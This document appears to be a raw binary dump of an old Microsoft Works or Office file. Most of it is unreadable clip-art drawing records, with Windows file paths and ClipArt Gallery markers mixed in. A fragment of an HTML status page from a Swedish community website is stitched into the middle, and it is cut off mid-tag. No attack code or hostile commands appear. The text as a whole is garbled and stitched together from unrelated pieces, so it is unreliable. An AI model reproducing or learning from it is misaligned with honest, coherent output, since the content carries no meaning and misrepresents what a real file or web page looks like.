�����������������������������������}���z���v���r���o���k���e���`���Z��S��M��F��@��:���4���.���)���)��+�	�,��,��.��1��4��6�!�7�'�8�*�9�.�9�2�;�5�?�;�H�;�Q�;�Y�;�b�;�k�;�s�<�{�>��@��I���S���_���l���y���������������������������������   -    �    -    -    �  ���      -     &   $ H���G���C���?���;���0���)���%��� ���&���,���1���7���;���@���D���H���   -    �    -    -    �  ���      -     J   $# ��k���n���q���s���r��_���[���Y���Y���Y���Z���\���]���_��`��a��b��d��g��j��m��p���r���s���t���t���r���o���k���h���e���c���d���f���k�   -    �    -    -    �  ���      -     @   $ `���a���`���]���Y���U���P���K���F���F���A���<���8���3���/���,���)���'���(���+���0���6���:���?���D���I���O���V���]���`���   -    �    -    -    �  ���      -     H   $" ������������������������������������������������������{���{�����������������������������������������������������   -    �    -                        f���   -    �    -    -    �  ���      -         $ ���������
������������������
���
�n��{������������������������������������������|���m���`���R� �D��7��a��a�
�   -    �    -    -    �   33      -     "  $� ��s��  ���All Categories C:\Program\Microsoft Works\workscor\j0160042.wmf   � �G� \�      �   � �7�         $=w� � PO4���n ���g���  �            � x     �n č��  �       @�n & x  �            ����� x                ��n        All Categories0C:\Program\Microsoft Works\workscor\j0160042.wmf                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  �������������������������������������������
�x��j��\��M��>��/�   -    �    -    -    �  ���      -     .   $ @�6�;�3�6�1�0�1�*�1�#�2��3��4��5��8��;�"�>�'�A�,�D�1�G�5�K�9�O�@�L�A�F�@�>�@�6�   -    �    -    -    �  ���      -     �   $J ����������������������������������������������������������~���z���w���t���u���w���z���}����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   -    �    -    -    �  ���      -     d  $� ��������������������������v���k���a���^���[���Y���X���V���T���R���O���J���H���H���I���K���L���M���O���S���X���Z���Y���R���L���F���@���:���5���0���,��)�z�&�i�#�W� �W��W��V��V��^��f��n��v��}�����������������������������#���)���1���4���6���6��5��/��(���!��!�� ���
���������������������
���������������������������������������������������� ������
��
�������������������
�����������������������������������}���z���v���r���o���k���e���`���Z��S��M��F��@��:���4���.���)���)��+�	�,��,��.��1��4��6�!�7�'�8�*�9�.�9�2�;�5�?�;�H�;�Q�;�Y�;�b�;�k�;�s�<�{�>��@��I���S���_���l���y���������������������������������   -    �    -    -    �  ���      -     &   $ H���G���C���?���;���0���)���%��� ���&���,���1���7���;���@���D���H���   -    �    -    -    �  ���      -     J   $# ��k���n���q���s���r��_���[���Y���Y���Y���Z���\���]���_��`��a��b��d��g��j��m��p���r���s���t���t���r���o���k���h���e���c���d���f���k�   -    �    -    -    �  ���      -     @   $ `���a���`���]���Y���U���P���K���F���F���A���<���8���3���/���,���)���'���(���+���0���6���:���?���D���I���O���V���]���`���   -    �    -    -    �  ���      -     H   $" ������������������������������������������������������{���{�����������������������������������������������������   -    �    -                        C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~   �����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������                  ries C:\Program\Microsoft Works\workscor\j0160042.wmf   � �G� \�      �   � �7�         $=w� � PO4���n ���g���  �            � x     �n č��  �       @�n & x  �            ����� x                ��n        All Categories0C:\Program\Microsoft Works\workscor\j0160042.wmf                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  ����������������������������������������������������������������������������������������������������� ���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~   ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������<html>
 <head>
 	<title>status</title>
 <META HTTP-EQUIV="Refresh" CONTENT="180; URL=http://www.funplanet.com/cgi-bin/_scripts/club/status.cgi?action=start2&country=se">
 <base href="http://www.funplanet.com/se/">
 <link href="/_css/fp_style.css" rel="stylesheet" type="text/css">
 </head>
 
 <body bgcolor="#FFFFFF" MARGINWIDTH="6" MARGINHEIGHT="0" LEFTMARGIN="6" TOPMARGIN="0">
 <table width="111" cellspacing="0" cellpadding="0" border="0">  
 <tr>
 	<td colspan="5"><img src="/_images/transparent.�  ���All Categories C:\Program\Microsoft Works\workscor\j0167836.wmf   � ��� `W       �   � ���         -x� � �@4���n ���g���  �            � x     �n č��  �       @�n & x  �            ����� x                ��n        All Categories0C:\Program\Microsoft Works\workscor\j0167836.wmf                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  border="0" cellspacing="1" cellpadding="1">
 		<tr>
 			<td valign="top"><a href="/_scripts/club/guestbook/gb.php?country=se&action=view&from=0" target="main"><img src="/_images/icons/club/guest_01.gif" width="13" height="12" border="0"></a></td>
 			<td><img src="/_images/transparent.gif" width="2" height="1"></td>
 			<td>0 nya <a href="/_scripts/club/guestbook/gb.php?country=se&action=view&from=0" target="main">inl�gg</a></td>
 		</tr>
 		<tr>
 			<td colspan="3"><img src="/_images/transparent.gif" width="1" height="2"></td>
 		<tr>
 		<tr>
 			<td valign="top"><a href="/cgi-bin/_scripts/club/messages.cgi?country=se" target="main"><img src="/_images/icons/club/fms.gif" width="13" height="12" border="0"></a></td>
 			<td><img src="/_images/transparent.gif" width="2" height="1"></td>
 			<td>0 nya <a href="/cgi-bin/_scripts/club/messages.cgi?country=se" target="main">FMS</a></td>
 		</tr>
 		<tr>
 			<td colspan="3"><img src="/_images/transparent.gif" width="1" height="2"></td>
 		<tr>
 			<td valign="top"><a href="/cgi-bin/_scripts/club/friends.cgi?country=se" target="main"><img src="/_images/icons/club/friend.gif" width="13" height="12" border="0"></a></td>
 			<td><img src="/_images/transparent.gif" width="2" height="1"></td>
 			<td>1 <a href="/cgi-bin/_scripts/club/friends.cgi?country=se" target="main">kompisar</a> inloggade.</td>
 		</tr>
 		<tr>
 			<td colspan="3"><img src="/_images/transparent.gif" width="1" height="1"></td>
 		<tr>
 		<tr>
 			<td valign="top" colspan="3"><a href="/cgi-bin/_scripts/club/search.cgi?action=show_inlogged&country=se&page=0" target="main">Inloggade</a> just<br> nu: <b>349</b> personer.</td>
 		</tr>
 		</table>
 <!-- END CONTENT -->
 	</td>
 </tr>
 <tr>
 	<td colspan="5" valign="top"><img src="/_images/std_menu_down.gif" width="111" height="4"></td>
 </tr>
 </table>
 </body>
 </html>                                                                                                                                                                                                                                                                                              ����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������� ���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������� ��
  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q            ���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~   ��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������� ���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C����         ����       �    �&   	  W   �       4��   ��   ����   z��   �          -  	   �          "    -    
������� ���,���<��Q�/�j�E���W���e���p���y���~���*�   �  ���      -    �    -    -    �           -       $����������������������������z���j���Z���K���<���.���!������	�v���g���X���.������������������� ���3���G���Z���l���������������������������������0���C���V���h���{�����������������������������������	����o��V��>��'�����������������������������r��^��I�y�4�q��l��k���m���r���z����������u��p��m��k���j���j���k���l���n���i���e���c��a��`��`��`��b��d�t�f�i�i�]�m�R�q�G�u�<�y�2�~�)��� �������������������������������������������������������������u���k���a���W���N���E���=���4���,���%�������������������������������������������
�}���n���]���L���;���(������ �~���r���h��`��[��X�w�X�]�[�I�_�4�e� �l��s���z������������������y���d���O���:���&��������v���k���a���X��P��L��K�r�O�Y�Y�F�g�8�y�.���%������������������������0���D��Z��o��������������(���7���G���W�}�h�v�z�o��j��e��b���_���^���^���^��`� �c�.�f�=�k�K�p�X�v�f�|�s������k���U���A���-������
�����������������������������������������s���h���\���R���G���=���4��-��'��"���&��/��7��@��I���L���Q���V���]��d��l��v����y���k���]���Q���E���;���1���)���$����������)��4�
�Q���b���y����������m��I��%����������������������������������������������������������������������9��^�������0���K���U���`���k���w���������������� ���$���&���'���(���'��%��"���)��4��?��I��T�
�^��i��s���~��������������������������   -    -    -    -     �  $h����q���a���R���B���3���$���������������|���m���^���M���=���+������������f��)��������{�v�F�l�4�a�"�U��H��:���+����������������������������������t���]���G���2������������������������������y���d���O���9���"������
���������������������������������~���}���p���c���V���O���I���E���B���N���Y���e���p���|��������������������������������������������������������������������������������s���b���S���E���8���/���)���#�����������!��-�*��8��G�	�W��h���z���������� ����������������������������������
��	��	���x��i��[��N�&�A�1�6�=�-�J�&�Y� �j��{�������#���3���D�u�V�j�h�_�{�V��M��G��A���=���;���:��:��<�3�@�H�F�X�L�h�S�x�[��d��n��y���������������������������	���������%��*��.��1�%�2�0�1�;�.�F�'�P��W��]�
�P��D��7��)����
����������������������������������x���e���R���A���1������1���I��`��w�(��=��S��j�������������������������������~���u���l���e���_���Y���S���M���H���C���?���7���1���.���1���5���9���?���F���M���T���[���c���i���o���u���z���~������������������������{���~���~���z���r���m���h���c���^���Y���T���O���K���G���F���I���M���S���[���c���k���s���|�������������������������o��Y�p�E�\�2�F�"�/���
�
�������������������������������v�
�i��[��O��C�(�8�2�4�7�2�<�0�B�.�H�>�I�N�K�_�M�o�O�~�R��V��Z��_��e���k���r���z���������
���������#���&���&���$��������������"���*���0���4���6���8���8���6���4��/��)�t��m��h��g���h���k���p���v���~�������������������������������������������������������������������������� ������������������ ���������������������������������������������������������������������������������������������������!���#���$���"������������������������
�>��M��]���m���~�������������������������� �����#��1��M�.�h�C��Y���o����������������1���P���o���������������������8���I���O���O�Y�N�/�Q��]���w���������������������������
�a��G��.���'���6���p���N���3������
������������'���,���0���0���,���$�|��v��t��s��r��r��r��s� �t���v���z���~����������������������������������������������������w���o���h���c���_� �\�	�Z��Y��Y�#�Z�)�[�0�^�6�a�<�e�A�j�E�p�I�v�N���K���D���8���0���'������������������������������������������p��]��I��5��"���� �����������������������������x���e���S���B���3� �'���+��B��Z��r����"���&���+���0���7���>���E���L���S���X���]���b���g���k���o���r���t���v���t���m���a���]���X���T���O���K���G���D���B���@���?���=���;���9���9���:���>���A�}�E�x�I�s�N�p�S�m�X�j�^�i�d�h�l�h�u�h�}�i��l��o��t��z����������������������w���m���c���Y���O���E���;���1���(��� ��������� �����n���X���B���+����������������������������������!��$��'��+��/��5��K��a���x�����������������������������������$���5���E���V���f���v�������������������������������������!���0���?���N���\���j���x���������������������   -    -    -    -     X   $* ��o��^��N�~�?�x�0�q�"�k��f��c���`��`��b�+�c�>�b�Q�^�b�T�p�D�|�5���%������������������������������������������������������+���7���C���O���Z���e���o���y����o�   -    -    -    �  ���      -     h   $2 ��h��o��s��u���t���q���n���i��d��`��[�+�X�7�U�C�T�P�U�\�X�h�]�s�d�~�m��v��~������������������x��l�}�]�k�O�Y�B�E�:�-�8��:��>��C���I���O���W���^���f��i��j��j��i��g��e��c��b��h�   -    �    -    -    �  ���      -       $� ���������'���6���G���Z���o�������
�������
���(�h�?�6�L�   -    �    -    -    �  ���      -     &   $ \�k�X�h�O�`�D�S�9�A�1�,�0��7���K���J���G���D���B��B�%�F�=�N�U�\�k�   -    �    -    -    �  ���      -     F   $!  �.�!�-�#�)�&�#�+��1��9��A��L���W���d���r����������������!���!�����������������|��n��`��R��D��7��+�%� �.�   -    �    -    -    �  ���      -     F   $! ��������
���#��)�+�0�:�6�J�<�[�@�m�B��A���>���7���+������������
���������������"���&���*��-�t�.�_�-�I�+�2�&������   -    �    -    -    -     �   $C ���������������������y���e���Q���B���2���"���������������������������������{���j���Z���J���G���W���h���z�������������������������������$���6���I���\���n�����������������������������	����$�"�3�/�C�:�R�D�c�L�s�T���n���j���d���[�l�O�G�?�$�)��
 L� P� V� c� f� c� [� P� L� L�    �  �Ÿ      -    �    $ �)�.�/�&������)�)   $ ��� �� �� �� �� � 
� � ��   �  ̌�      -    � ,   $  )6CMTYX Q�F�;�,���	   �  ���      -    �    $ �8�C�F�8���   �           -    �    $ @ h O e ] � _ � W � @ h @ h >   $  �  � ) � 0 � : � @ � E � H � L � T � ] � b � b � ` U P � G � < � 5 � * � $ � * � * � % �  �  �  �  �  �    $	 e 	r 	{ � { $o $g e 	e 	   $ _ � h � m � j � _ � _ � _ �    $
� � � � � 	� � � � $   $ � � (3
?K
"*)22879;7>3B+GN
U�\�e�k�o�r�t�t|tppckTbCX3L B:2� +� $� � � 
�
����������������(   $ i�r���������������������������t�i�i�"   $ 	����#�)�/�/�(����	�	�	�&   $ 9EBMGTN]TeYn^udcval]cVZQSOMGE9E9E(   $ W>^FeMmTt\zck�s�y�n�bxVqPiHcB^<W>W>R   $' ��(�2�<�D�N�X�a�k�w������'�-�1�6�&����� ������t�g�X�L�?�5�,�%����N   $% `,p4?�F�K�O�T�Z�`�d�d�g�k�p�z���������������x�q�m�n�j�f�a�[�U�R�Jn@_6`,`,*   $ SD^LeUl_rhupyw|���z�t~mshia`[WUQJGSDSDR   $' +>(N$[!gsy#~'+~/~3{2�3�6�9�>�B�H�N�R�X�Z�T�L�F�A�B|At?p;l5o/r+q.j1\4P9D+>+>�   $l XPXXVcSlPsL{L�N�R�U�Z�^�c�f�j�k�k�e�Y�P�B�9�)�����������t�g�T�F�;�5�+���� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� ���'�2�>�Q�f�z���������������� �'�6�J�^�r������������������������������z�v�o�j�e�a�_�^�^{aocdeXdP_LXPXP^   $- P�T�X�[�^�c�i�o�t�y�|�����������������������������������������������}�x�q�l�g�d�^�V�R�P�P�2   $ =Z7Y2\-`*e*j.o5s:u@uCpCkDg?c:c9h5k3e6b9_=_=Z=Z   $
  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q            �����������������������������N   $% �1�#����������������"�3�B�M�W�_�h�c�V�?�*�������������������
�������(�-�1�1�1�3�7�9�:�>�F�Q�Z�b�h�n�g�_�S�F|>u6r2v0}-�+�+�)�'���� y�n�f�^�\�Z�c�c0   $ � ������������
����!�#�#�"� � D   $  q^vb{b^�X�R�N�G�C�6w-n%aXL>0&� "0>JU!i/w>{F{KwRq^q^R   $' �� �� �� �� �� �� �� �� �� �� �� �� �� �����
���� �� �� �� �� �� �� �� �� �� �� 6   $ ��� �� �� �� �� �� �� ��  � � 	� 	� � � � �� �� �� �� �� ���0   $ MSZ+b8gFjSlhm}n�n�i�n�s�t�uxvfvNu@t3_MM.   $ (� 3� ;� C� I� N� P� M� G� =� 5� +� !� � � � &   $ X� [ ^cgjkkfc� b� `� \� U� W� X� X� Z   $+ �� �� �� �� �� �� �� �� �� �� �� �� �� ����~uokm r v��������� �� �� �� �� �� �� �� �� �� �� ��    $ Q� T� W� \� a� c� c� ^� \� U� Q� Q� <   $ �� x� n� c� W� M� G� @� =� C� I� N� R� T� W� X� X� T� P� L� S� ^� k� v� � �� �� ��                        1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     0|@      @                      D�ȁF��2�H��!�C�# ���O�                                                                        
B��z5��ç #�I�O�                                                                        
E5��3b��K ��|�O�                                                                           kart2[2].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ��@       @                      ��B.3o�~"Q��9�"q�t �~�O�                                                                           kart3[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     8�@       @                      ���=
���
���	�������������������������������������������������������������s���a���M���8���8���&�����������������������������������������~���s���i���^���T���J���?���3���&�������|�	�����������������{���u���o���p���t�m�t�P�j�5�e�&�_��Y�	�T���P���M���L���N���W���_���d���f�}�f�}�d�r�`�h�Z�`�R�Y�M�W�H�T�B�R�=�P�7�N�2�L�,�I�'�G�,�=�3�3�:�)�A��G��K��M���L���I���F���B���?���:���6���0���+���%�������������������������������������������������������������������������������������v���k���`���T���G���=���3���)��� �����������������������.�	�/��0���1���1���2���3���4���6���7���9���<���>���?���?���>���<���<���=���?���@��A��D�~�H�w�M�p�S�j�Y�e�`�b�h�`�p�_�}�b���g���l���l���r���z���������x��o��j�-�l�A�n�A�p�H�q�Q�p�Y�n�`�i�f�e�l�`�r�]�y�Y��V���S���P���M���L���M���N���O���P���O���O���M���F���>���7���.��%���,��?�
������������ ���!���"���"���#���%���(���*���,���.���*���'���%���#���������������� ����� �
���	�����������������������������������������������������������������������������������{���w���t���l���e���]���V���N���G���@���9���4���0���+���'���"���������������������������������%���+���0���5���8���:���;���<���;���5���-��%�x��o��a��c�
�d��f���g���h���h���i���j���k���l���l���n���s���{��������������������������������������������������������������������������������������������������������"���,���4���<��?�
�C��F��J��M�!�R�&�W�+�]�(�\�#�[��Y��X��R� �L���E���=���4���)���������������������������������������������"���%���)���/���5���<���C���J���R���Z���c���f���j���o���s���������������������������������������������������������������������� ����������� ��-��9��E��F��G��G�
�]�
�Y���X���X���X���W���Q���I��>��3� �&�+��5��?���G���E��:��0��&�%��-��4��8���9���:���:���:���;���5���0���-���*���'���$��� �����������	��� ���&���,���1���/���&� ����	��
�R��L���F���?���^���a���e���i� �l��q��v�	�z�
���������������
�/��)��#����� �"���&���*���B���Z��p�������~��|���y���v���r���n���i���o���w����������������� ���������'���5���B���6���*��������������������������������������������������������������������&���.� �6��>��G��O��W��^��^��O��A��3��&������ �����������������!��)��1��9�)�@�6�F�D�L�S�P�c�S�l�V�c�V�Z�V�R�V�I�V�@�V�7�U�/�U�'�T�'�U�#�V��V��U��T��S��R�
���
����/��B��E��J��N��R�"�b�%�v�*���5���5���5���4���4���-���'���!�������{��t�
������������ ���&���-���5���>���F���N���V���^���d���k���p���t���x���}�
���������)���3���>���B���G���M���S���Z���b���j���s���w���}�������������������������������������������������������������������������������
������*���9���I���X���h���y���|���~���������{���v���p���j���d���`���]���\���X���S�x�M�m�G�b�@�W�:�L�5�A�1�5�4�5�;�?�B�H�J�Q�S�Z�[�c�c�l�j�v�q����������������������������������������&���7���H���Y���j���{�������������������������������������������������������������������������������=���=���E���M���U���]���e���l���s���z���s���l���e���^���V���O���G���@���@���6���-���$���������
������������������������������������)���2���<���D���M���V���_���i���   -    �    -    -    �   33      -     (   $ ��{���t���y���}�������������������������������������������������������{�   -    �    -    -    �   33      -     .   $ m�u�k�o�g�l�b�i�^�g�V�g�O�h�H�k�A�l�@�n�?�p�>�q�?�s�D�u�J�w�P�y�U�{�\�{�c�{�i�z�m�u�   -    �    -    -    �   33      -     ^   $- O�C�K�B�G�A�B�@�>�@�9�?�5�>�0�>�,�=��:��6��1���,���&��� ���������
����������������������������������������{��������������������������� ���(���/���5���:��>��A�*�C�<�D�O�C�   -    �    -    -    �   33      -     &   $ ��>���?���?���?���?���?���?���?���@���B���C���D���D���C���B���@���>�   -    �    -    -    �   33      -     �   $A ��$���!����������������t��g��c��_��Z�
����.��3��9� �>�!�D�"�I�#�O�$�U�%�[�%�`�&�e�'�j�(�o�(�u�(�z�)���)���)���)���)���)���(���(���'���%���$�   -    �    -    -    �   33      -     F   $! �����������
�b��i��q��z��������������������   -    �    -    -    �   33      -     h   $2 (��������������������������������������������������|�}�t�r�k�g�b�^�W�V�K�N�>�F�2�=�&�4��)���
�#��,�/�7�A�C�S�P�c�_�q�o�}�����������������������������������������������������	���������(���(���   -    �    -    -    �   33      -     *   $ $���$������������
���	���	���
������
�����������������z���t�y�n�q�i�h�c�`�\�Y�T�R�K�L�;�A�*�7��-��%��� ���������%���'���*���,���.���0���2���5���9���9���;���>���B���G���N�
�U��^�!�e�%�o�)�y�1���4���5���7���9���;���<���>���?���A���@���>���;�	�7��5�1�6�F�9�\�>�l�C�|�J���S���X���\���_���c���g���l���s���{�������   -    �    -    -    �   33      -     8   $ o���l�y�i�k�g�]�f�M�b�8�c�!�f�
�j���k���i���i���h���f���`���c���d���c���^��U�,�R�M�U�l�b���q���o���o���   -    �    -    -    �  ���      -     �   $? ��������������������������t���h���^���R���F���;���/������������������������������������l���U���?���*���������/���D���0���0�������������������������%���6���C���O���\���i��������������������������,���W�����������������������������������������   -    �    -    -    �  ���      -     X   $* 
��$� �B� �a����������������	���
������
�������� ��)��2��;��D��>��8��2��-�   -    �    -    -    �   33      -         $ =��>��@��A��B�
������������������
���
�n��{������������������������������������������|���m���`���R� �D��7��a��a�
�   -    �    -    -    �   33      -     "  $� ��s���b���O���=���,������ ��������}���u���k���_��Y�|�R�y�L�w�E�u�>�t�6�s�/�q�(�p�+�r�/�s�3�u�7�v�;�x�?�z�C�}�G��L���Q���U���Z���Y���V���R���O���-���0���5���9���=���F���M���R���U���U���N���H���A���:���B���H���L���Q���T���X���\���a���t��p��l��h��d��`��\��X��U�
�^��f�
�j��j��j�
�)��&���#���;���R���i������������������������������������������������
�x��j��\��M��>��/�   -    �    -    -    �  ���      -     .   $ @�6�;�3�6�1�0�1�*�1�#�2��3��4��5��8��;�"�>�'�A�,�D�1�G�5�K�9�O�@�L�A�F�@�>�@�6�   -    �    -    -    �  ���      -     �   $J ����������������������������������������������������������~���z���w���t���u���w���z���}����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   -    �    -    -    �  ���      -     d  $� ��������������������������v���k���a���^���[���Y���X���V���T���R���O���J���H���H���I���K���L���M���O���S���X���Z���Y���R���L���F���@���:���5���0���,��)�z�&�i�#�W� �W��W��V��V��^��f��n��v��}�����������������������������#���)���1���4���6���6��5��/��(���!��!�� ���
���������������������
���������������������������������������������������� ������
��
�������������������
�����������������������������������}���z���v���r���o���k���e���`���Z��S��M��F��@��:���4���.���)���)��+�	�,��,��.��1��4��6�!�7�'�8�*�9�.�9�2�;�5�?�;�H�;�Q�;�Y�;�b�;�k�;�s�<�{�>��@��I���S���_���l���y���������������������������������   -    �    -    -    �  ���      -     &   $ H���G���C���?���;���0���)���%��� ���&���,���1���7���;���@���D���H���   -    �    -    -    �  ���      -     J   $# ��k���n���q���s���r��_���[���Y���Y���Y���Z���\���]���_��`��a��b��d��g��j��m��p���r���s���t���t���r���o���k���h���e���c���d���f���k�   -    �    -    -    �  ���      -     @   $ `���a���`���]���Y���U���P���K���F���F���A���<���8���3���/���,���)���'���(���+���0���6���:���?���D���I���O���V���]���`���   -    �    -    -    �  ���      -     H   $" ������������������������������������������������������{���{�����������������������������������������������������   -    �    -                         �������������
����/��B��E��J��N��R�"�b�%�v�*���5���5���5���4���4���-���'���!�������{��t�
������������������������������������)���2���<���D���M���V���_���i���   -    �    -    -    �   33      -     (   $ ��{���t���y���}�������������������������������������������������������{�   -    �    -    -    �   33      -     .   $ m�u�k�o�g�l�b�i�^�g�V�g�O�h�H�k�A�l�@�n�?�p�>�q�?�s�D�u�J�w�P�y�U�{�\�{�c�{�i�z�m�u�   -    �    -    -    �   33      -     ^   $- O�C�K�B�G�A�B�@�>�@�9�?�5�>�0�>�,�=��:��6��1���,���&��� ���������
����������������������������������������{��������������������������� ���(���/���5���:��>��A�*�C�<�D�O�C�   -    �    -    -    �   33      -     &   $ ��>���?���?���?���?���?���?���?���@���B���C���D���D���C���B���@���>�   -    �    -    -    �   33      -     �   $A ��$���!����������������t��g��c��_��Z�
����.��3��9� �>�!�D�"�I�#�O�$�U�%�[�%�`�&�e�'�j�(�o�(�u�(�z�)���)���)���)���)���)���(���(���'���%���$�   -    �    -    -    �   33      -     F   $! �����������
�b��i��q��z��������������������   -    �    -    -    �   33      -     h   $2 (��������������������������������������������������|�}�t�r�k�g�b�^�W�V�K�N�>�F�2�=�&�4��)���
�#��,�/�7�A�C�S�P�c�_�q�o�}�����������������������������������������������������	���������(���(���   -    �    -    -    �   33      -     *   $ $���$������������
���	���	���
������
�����������������z���t�y�n�q�i�h�c�`�\�Y�T�R�K�L�;�A�*�7��-��%��� ���������%���'���*���,���.���0���2���5���9���9���;���>���B���G���N�
�U��^�!�e�%�o�)�y�1���4���5���7���9���;���<���>���?���A���@���>���;�	�7��5�1�6�F�9�\�>�l�C�|�J���S���X���\���_���c���g���l���s���{�������   -    �    -    -    �   33      -     8   $ o���l�y�i�k�g�]�f�M�b�8�c�!�f�
�j���k���i���i���h���f���`���c���d���c���^��U�,�R�M�U�l�b���q���o���o���   -    �    -    -    �  ���      -     �   $? ��������������������������t���h���^���R���F���;���/������������������������������������l���U���?���*���������/���D���0���0�������������������������%���6���C���O���\���i��������������������������,���W�����������������������������������������   -    �    -    -    �  ���      -     X   $* 
��$� �B� �a����������������	���
������
�������� ��)��2��;��D��>��8��2��-�   -    �    -    -    �   33      -         $ =��>��@��A��B�
������������������
���
�n��{������������������������������������������|���m���`���R� �D��7��a��a�
�   -    �    -    -    �   33      -     "  $� ��s� ��
  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q            ��Z���Y���V���R���O���-���0���5���9���=���F���M���R���U���U���N���H���A���:���B���H���L���Q���T���X���\���a���t��p��l��h��d��`��\��X��U�
�^��f�
�j��j��j�
�)��&���#���;���R���i������������������������������������������������
